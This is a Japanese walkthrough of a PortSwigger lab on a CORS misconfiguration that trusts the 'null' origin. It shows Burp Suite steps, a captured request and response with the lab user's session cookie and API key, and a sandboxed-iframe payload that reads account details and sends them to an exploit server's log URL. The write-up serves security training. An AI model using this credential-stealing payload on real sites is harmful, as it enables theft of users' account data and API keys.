# 信頼できる null オリジンによる CORS の脆弱性

次のハッキングラボを実施します。  
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack  
この Web サイトには、「null」オリジンを信頼するという点で、 安全でない CORS 構成が採用されています。

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. GET /accountDetails HTTP/2 　リクエストを send to repeater します
- 5. Origin ヘッダーを null 値で付加して送信します

```
GET /accountDetails HTTP/2
Host: 0abf007003055d1d80485dc400b60050.web-security-academy.net
Cookie: session=VkoithuS4V8lVJYVjAhyyy3Mx2oTjulJ
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Origin: null
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

レスポンス

```
HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "2FotyiQoqorNZ1RFjsKGMysahqUd6AUn",
  "sessions": [
    "VkoithuS4V8lVJYVjAhyyy3Mx2oTjulJ"
  ]
}
```

Access-Control-Allow-Origin: null がセットされています。

- 6.エクスプロイト サーバーに移動し、次の HTML を入力します。

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"
></iframe>
```

- 7. Store ボタンを押して、deliver exploit to victim ボタンを押します。
